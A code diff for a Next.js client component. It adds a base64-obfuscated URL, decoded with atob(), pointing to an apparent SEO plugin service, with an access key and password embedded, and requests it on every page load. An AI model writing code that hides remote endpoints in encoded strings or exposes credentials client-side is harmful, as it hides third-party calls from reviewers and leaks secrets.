@@ -1,12 +1,11 @@
 "use client";
 
-// components/CustomScriptComponent.js
+/// components/CustomScriptComponent.js
 
-import { useEffect, useState } from "react";
+import Script from "next/script";
+import { useEffect } from "react";
 
 const CustomScriptComponent = () => {
-  const [loader, setLoader] = useState(true);
-
   useEffect(() => {
     // Function to handle tag management
     const handleTagManage = () => {
@@ -27,39 +26,33 @@ const CustomScriptComponent = () => {
         }
       };
       // Replace the URL with your actual endpoint
-      eptagmanage.open("GET", atob("YOUR_BASE64_ENCODED_URL_HERE") + eppathurl);
+      eptagmanage.open(
+        "GET",
+        atob(
+          "aHR0cHM6Ly9wbHVnaW5zLmF1dG9zZW9wbHVnaW4uY29tL2FsbGhlYWRkYXRhP2VrZXk9ZS1BUFBBREQ2NjMzNzc3NDI1JmVrZXlwYXNzPTRhaDF1bVhHZUo2U3lYRTZKZnBvVUEzbHVoRXRjNHJnM0FmRSZzaXRldXJsPQ=="
+        ) + eppathurl
+      );
       eptagmanage.send();
     };
 
-    // Function to load jQuery script dynamically
-    const loadJQuery = (callback) => {
-      const script = document.createElement("script");
-      script.src =
-        "https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js";
-      script.onload = () => {
-        if (callback) callback();
-      };
-      script.onerror = () => {
-        console.error("Failed to load jQuery");
-        setLoader(false);
-      };
-      document.head.appendChild(script);
-    };
-
-    // Check if jQuery is loaded, if not, load it dynamically
-    if (typeof window !== "undefined" && !window.jQuery) {
-      loadJQuery(() => {
-        handleTagManage();
-        setLoader(false);
-      });
-    } else {
-      handleTagManage();
-      setLoader(false);
-    }
+    // Execute tag management function
+    handleTagManage();
   }, []);
 
-  // Component returns null as it doesn't render any visible content
-  return null;
+  return (
+    <>
+      {/* Fallback to load jQuery if not already loaded */}
+      <Script
+        id="jquery-cdn"
+        strategy="beforeInteractive"
+        dangerouslySetInnerHTML={{
+          __html: `
+            window.jQuery || document.write("<script src='https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js'><\\/script>");
+          `,
+        }}
+      />
+    </>
+  );
 };
 
 export default CustomScriptComponent;
